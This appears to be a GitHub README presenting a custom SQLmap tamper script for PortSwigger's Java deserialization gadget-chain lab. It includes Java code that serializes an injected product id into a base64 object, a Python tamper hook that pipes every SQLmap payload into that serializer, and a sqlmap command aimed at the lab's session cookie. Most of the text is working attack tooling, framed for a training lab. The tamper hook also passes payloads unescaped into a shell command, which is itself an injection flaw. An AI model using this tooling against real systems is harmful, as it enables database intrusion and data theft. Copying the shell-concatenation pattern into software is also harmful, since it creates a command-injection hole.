# SQLmap tamper script for Java deserialization gadget chain
Custom SQLmap tamper script for automating SQL injection in [PortSwigger's Java deserialization gadget chain lab.](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

## Contents of Main.java

```java
package data.productcatalog;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException
    {

        ProductTemplate product = new ProductTemplate(args[0]);


        ByteArrayOutputStream byte1 = new ByteArrayOutputStream(512);

        ObjectOutputStream out = new ObjectOutputStream(byte1);


        out.writeObject(product);

        System.out.println(Base64.getEncoder().encodeToString(byte1.toByteArray()));



    }
}

class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;

    public ProductTemplate(String id)
    {
        this.id = id;
    }


}
```
## Contents of java-gadgetchain-sqli.py
```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    import subprocess

    payload = subprocess.getoutput("java Main.java "+ '"' + payload + '"')

    return payload
```

## **Steps to Use**

1. **Clone the repository**

2. **Navigate into the directory**

3. **Run SQLmap with the tamper script**

   `sqlmap -u "https://YOURLAB.web-security-academy.net/" --cookie="session=*" --tamper=java-gadgetchain-sqli.py`



![Screenshot (1)](https://github.com/user-attachments/assets/be5af110-3135-468e-914e-0993015b3230)
![Screenshot (2)](https://github.com/user-attachments/assets/33e259f8-1ebd-4318-b406-a5e4ef2dd52c)

